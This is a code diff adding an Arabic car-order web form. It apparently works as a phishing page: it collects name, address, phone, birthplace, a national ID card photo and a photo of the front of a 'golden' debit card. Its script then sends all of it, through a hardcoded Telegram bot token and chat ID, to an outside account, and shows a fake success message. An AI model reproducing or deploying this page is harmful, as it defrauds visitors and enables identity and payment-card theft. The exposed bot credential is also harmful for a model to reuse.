@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>طلب السيارة — نسخة احترافية</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.rtl.min.css" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" rel="stylesheet">
+  <style>
+    :root{
+      --brand:#8B0000;          /* أحمر كلاسيك */
+      --brand2:#B22222;         /* FireBrick */
+      --accent:#4BB543;         /* أخضر نجاح */
+      --muted:#6c757d;
+    }
+    body{
+      background:#f2f2f2;
+      font-family:'Tahoma', system-ui, sans-serif;
+      color:#1f2937;
+      padding:28px 10px;
+    }
+    .app-card{
+      max-width:880px;margin:0 auto;background:#fff;border-radius:14px;
+      box-shadow:0 14px 45px rgba(0,0,0,.12); overflow:hidden;
+      animation:fadeIn .5s ease both;
+    }
+    @keyframes fadeIn{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:translateY(0)}}
+    .header{
+      background:linear-gradient(135deg,var(--brand),var(--brand2));
+      color:#fff;padding:18px 22px;
+    }
+    .header h1{font-size:1.35rem;margin:0;font-weight:800}
+    .content{padding:22px}
+    .form-label i{color:var(--brand);margin-left:6px;}
+    .small-hint{font-size:.85rem;color:#64748b}
+    .btn-brand{
+      background:linear-gradient(135deg,var(--brand),var(--brand2));border:none;color:#fff;font-weight:700;
+    }
+    .btn-brand:disabled{opacity:.8}
+    /* Dropzone */
+    .dropzone{
+      position:relative;border:2px dashed #d0d5dd;border-radius:12px;background:#fafafa;
+      padding:18px;text-align:center;transition:.25s ease;
+    }
+    .dropzone:hover,.dropzone.dragover{border-color:var(--brand);background:#fff5f5}
+    .dropzone .dz-icon{font-size:28px;color:var(--brand)}
+    .preview{display:none;margin-top:10px}
+    .preview img{max-width:100%;border-radius:10px;box-shadow:0 8px 24px rgba(0,0,0,.08)}
+    .preview .meta{font-size:.85rem;color:#475569;margin-top:6px;text-align:center}
+    .preview .actions{display:flex;gap:10px;justify-content:center;margin-top:8px}
+    .camera-btn{margin-top:8px}
+    /* Loading on submit */
+    .spinner-small{
+      width:1.1rem;height:1.1rem;border:.15rem solid rgba(255,255,255,.7);border-top-color:transparent;border-radius:50%;
+      display:inline-block;vertical-align:-2px;animation:spin 1s linear infinite;
+    }
+    @keyframes spin{to{transform:rotate(360deg)}}
+    /* Toast inline */
+    .toast-inline{display:none;border-radius:12px;padding:10px 14px;font-weight:600}
+    .toast-inline.show{display:block}
+    /* Success Modal */
+    .success-modal .modal-content{border:0;border-radius:16px;padding:22px 20px}
+    .success-mark{width:120px;height:120px;margin:0 auto 10px;display:block}
+    .success-text h4{margin:0;color:var(--accent);font-weight:800}
+    .success-text p{margin:6px 0 0}
+    /* SVG animation */
+    .path-check{stroke-dasharray: 48; stroke-dashoffset: 48; animation: dash 800ms ease forwards 200ms;}
+    .path-circle{transform-origin:50% 50%; animation: popIn 250ms ease forwards;}
+    @keyframes dash{to{stroke-dashoffset: 0;}}
+    @keyframes popIn{from{transform:scale(.8);opacity:.2}to{transform:scale(1);opacity:1}}
+  </style>
+</head>
+<body>
+  <div class="app-card">
+    <div class="header d-flex align-items-center justify-content-between">
+      <h1><i class="fa fa-car me-2"></i> طلب السيارة</h1>
+    </div>
+    <div class="content">
+      <div id="toast" class="toast-inline alert" role="alert"></div>
+
+      <form id="carForm" class="needs-validation" novalidate>
+        <div class="row g-3">
+          <div class="col-md-6">
+            <label class="form-label"><i class="fa fa-user"></i> الاسم</label>
+            <input type="text" class="form-control" name="firstName" required>
+          </div>
+          <div class="col-md-6">
+            <label class="form-label"><i class="fa fa-user"></i> اللقب</label>
+            <input type="text" class="form-control" name="lastName" required>
+          </div>
+          <div class="col-md-6">
+            <label class="form-label"><i class="fa fa-map-location-dot"></i> الولاية</label>
+            <input type="text" class="form-control" name="state" required>
+          </div>
+          <div class="col-md-6">
+            <label class="form-label"><i class="fa fa-phone"></i> رقم الهاتف</label>
+            <input type="tel" class="form-control" name="phone" placeholder="05XXXXXXXX" maxlength="10" required>
+            <div class="form-text small-hint"> </div>
+          </div>
+          <div class="col-12">
+            <label class="form-label"><i class="fa fa-location-dot"></i> العنوان بالضبط</label>
+            <textarea class="form-control" name="address" rows="2" required></textarea>
+          </div>
+          <div class="col-md-6">
+            <label class="form-label"><i class="fa fa-city"></i> مكان الازدياد</label>
+            <input type="text" class="form-control" name="birthPlace" required>
+          </div>
+
+          <!-- بطاقة التعريف -->
+          <div class="col-md-6">
+            <label class="form-label"><i class="fa fa-id-card"></i> صورة بطاقة التعريف الوطنية</label>
+            <div id="dz-id" class="dropzone">
+              <div class="dz-icon"><i class="fa fa-cloud-arrow-up"></i></div>
+              <div class="dz-invite small-hint">اسحب وأفلت الصورة هنا أو اضغط للاختيار — (PNG, JPG, WEBP ≤ 6MB)</div>
+              <input id="input-id" type="file" class="d-none" accept="image/jpeg,image/png,image/webp">
+            </div>
+            <div class="d-grid camera-btn">
+              <button type="button" class="btn btn-outline-secondary" id="btn-camera-id"><i class="fa fa-camera"></i> تصوير بالكاميرا</button>
+            </div>
+            <input id="camera-id" type="file" accept="image/*" capture="environment" class="d-none">
+            <div class="preview" id="prev-id">
+              <img id="img-id" alt="معاينة بطاقة التعريف">
+              <div class="meta" id="meta-id"></div>
+              <div class="actions">
+                <button type="button" class="btn btn-sm btn-outline-secondary" id="change-id"><i class="fa fa-rotate"></i> تغيير</button>
+                <button type="button" class="btn btn-sm btn-outline-danger" id="remove-id"><i class="fa fa-trash"></i> حذف</button>
+              </div>
+            </div>
+          </div>
+
+          <!-- البطاقة الذهبية -->
+          <div class="col-md-6">
+            <label class="form-label"><i class="fa fa-credit-card"></i>الواجهة الامامية للبطاقة الذهبية </label>
+            <div id="dz-gold" class="dropzone">
+              <div class="dz-icon"><i class="fa fa-cloud-arrow-up"></i></div>
+              <div class="dz-invite small-hint">اسحب وأفلت الصورة هنا أو اضغط للاختيار — (PNG, JPG, WEBP ≤ 6MB)</div>
+              <input id="input-gold" type="file" class="d-none" accept="image/jpeg,image/png,image/webp">
+            </div>
+            <div class="d-grid camera-btn">
+              <button type="button" class="btn btn-outline-secondary" id="btn-camera-gold"><i class="fa fa-camera"></i> تصوير بالكاميرا</button>
+            </div>
+            <input id="camera-gold" type="file" accept="image/*" capture="environment" class="d-none">
+            <div class="preview" id="prev-gold">
+              <img id="img-gold" alt="معاينة البطاقة الذهبية">
+              <div class="meta" id="meta-gold"></div>
+              <div class="actions">
+                <button type="button" class="btn btn-sm btn-outline-secondary" id="change-gold"><i class="fa fa-rotate"></i> تغيير</button>
+                <button type="button" class="btn btn-sm btn-outline-danger" id="remove-gold"><i class="fa fa-trash"></i> حذف</button>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="d-grid mt-4">
+          <button id="submitBtn" class="btn btn-brand btn-lg">
+            <span class="btn-text">إرسال الطلب</span>
+            <span class="btn-wip d-none"><span class="spinner-small me-2"></span> جارٍ الإرسال…</span>
+          </button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <!-- Success Modal -->
+  <div class="modal fade success-modal" id="successModal" tabindex="-1" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+      <div class="modal-content text-center">
+        <svg class="success-mark" viewBox="0 0 100 100">
+          <circle class="path-circle" cx="50" cy="50" r="46" fill="var(--accent)" />
+          <path class="path-check" d="M30 52 L45 67 L72 40" fill="none" stroke="#fff" stroke-width="8" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <div class="success-text">
+          <h4>شكراً</h4>
+          <p>✅ سيتم معالجة طلبكم والاتصال بكم عن قريب</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script>
+    const BOT_TOKEN = "8259868430:AAFQ-oqYzk-nd3cx47XqUdYhPCRQ9YDeWmM";
+    const CHAT_ID = "5794299315";
+    const MAX_SIZE = 6 * 1024 * 1024;
+    const ALLOWED = ["image/jpeg","image/png","image/webp"];
+
+    const toast = document.getElementById('toast');
+    function showToast(type, text){
+      toast.className = 'toast-inline alert alert-' + type + ' show';
+      toast.innerText = text;
+      setTimeout(()=> toast.className = 'toast-inline alert', 4200);
+    }
+    function humanSize(bytes){
+      const u = ['B','KB','MB','GB']; let i=0, n=bytes;
+      while(n>=1024 && i<u.length-1){ n/=1024; i++; } return n.toFixed(1)+' '+u[i];
+    }
+
+    function setupDropzone(key){ // 'id' | 'gold'
+      const dz = document.getElementById('dz-'+key);
+      const input = document.getElementById('input-'+key);
+      const camBtn = document.getElementById('btn-camera-'+key);
+      const camInput = document.getElementById('camera-'+key);
+      const prev = document.getElementById('prev-'+key);
+      const img = document.getElementById('img-'+key);
+      const meta = document.getElementById('meta-'+key);
+      const btnChange = document.getElementById('change-'+key);
+      const btnRemove = document.getElementById('remove-'+key);
+
+      function openPicker(){ input.click(); }
+      function handleFile(file){
+        if(!file) return;
+        if(!ALLOWED.includes(file.type)){ showToast('warning','⚠️ نوع ملف غير مدعوم'); return; }
+        if(file.size > MAX_SIZE){ showToast('warning','⚠️ الحجم كبير: الحد الأقصى 6MB'); return; }
+        const url = URL.createObjectURL(file);
+        img.src = url;
+        meta.textContent = file.name + ' — ' + humanSize(file.size);
+        prev.style.display = 'block';
+        dz.style.display = 'none';
+      }
+
+      dz.addEventListener('click', openPicker);
+      dz.addEventListener('dragover', (e)=>{e.preventDefault(); dz.classList.add('dragover');});
+      dz.addEventListener('dragleave', ()=> dz.classList.remove('dragover'));
+      dz.addEventListener('drop', (e)=>{ 
+        e.preventDefault(); dz.classList.remove('dragover');
+        const file = e.dataTransfer.files && e.dataTransfer.files[0];
+        if(file){ input.files = e.dataTransfer.files; handleFile(file); }
+      });
+      input.addEventListener('change', (e)=> handleFile(e.target.files[0]));
+
+      camBtn.addEventListener('click', ()=> camInput.click());
+      camInput.addEventListener('change', (e)=>{
+        const file = e.target.files[0];
+        if(file){ // mirror camera file into main input for submission
+          const dt = new DataTransfer();
+          dt.items.add(file);
+          input.files = dt.files;
+          handleFile(file);
+        }
+      });
+
+      btnChange.addEventListener('click', openPicker);
+      btnRemove.addEventListener('click', ()=>{ input.value=''; camInput.value=''; img.src=''; prev.style.display='none'; dz.style.display='block'; });
+
+      return {input};
+    }
+
+    const upID = setupDropzone('id');
+    const upGold = setupDropzone('gold');
+
+    // Submit
+    const form = document.getElementById('carForm');
+    const submitBtn = document.getElementById('submitBtn');
+    const btnText = submitBtn.querySelector('.btn-text');
+    const btnWip  = submitBtn.querySelector('.btn-wip');
+
+    function setLoading(on){
+      submitBtn.disabled = on;
+      btnText.classList.toggle('d-none', on);
+      btnWip.classList.toggle('d-none', !on);
+    }
+
+    form.addEventListener('submit', async (e)=>{
+      e.preventDefault();
+      if(!form.checkValidity()){ form.classList.add('was-validated'); showToast('danger','يرجى ملء جميع الحقول المطلوبة'); return; }
+      if(!upID.input.files[0]){ showToast('danger','يرجى رفع صورة بطاقة التعريف'); return; }
+      if(!upGold.input.files[0]){ showToast('danger','يرجى رفع صورة البطاقة الذهبية'); return; }
+
+      setLoading(true);
+      try {
+        const fd = new FormData(form);
+        const msg = `📌 طلب جديد%0A👤 الاسم: ${fd.get('firstName')}%0A👤 اللقب: ${fd.get('lastName')}%0A🏢 الولاية: ${fd.get('state')}%0A☎️ الهاتف: ${fd.get('phone')}%0A📍 العنوان: ${fd.get('address')}%0A🎂 مكان الازدياد: ${fd.get('birthPlace')}`;
+
+        // send text
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}`);
+
+        // send photos
+        const sendPhoto = async (file)=>{
+          const d = new FormData(); d.append('chat_id', CHAT_ID); d.append('photo', file);
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:'POST', body:d});
+        };
+
+        await sendPhoto(upID.input.files[0]);
+        await sendPhoto(upGold.input.files[0]);
+
+        // show success modal
+        const modal = new bootstrap.Modal(document.getElementById('successModal'));
+        modal.show();
+        form.reset();
+        document.getElementById('remove-id').click();
+        document.getElementById('remove-gold').click();
+      } catch(err) {
+        console.error(err);
+        showToast('danger','⚠️ حدث خطأ أثناء الإرسال. جرب مجددًا.');
+      } finally {
+        setLoading(false);
+      }
+    });
+  </script>
+
+<a href="https://wa.me/21366425117" target="_blank"
+   style="position:fixed;bottom:20px;left:20px;background:#25D366;color:white;
+          border-radius:50%;width:60px;height:60px;display:flex;align-items:center;
+          justify-content:center;font-size:28px;box-shadow:0 4px 8px rgba(0,0,0,0.2);z-index:1000;">
+  <i class="fab fa-whatsapp"></i>
+</a>
+
+</body>
+</html>
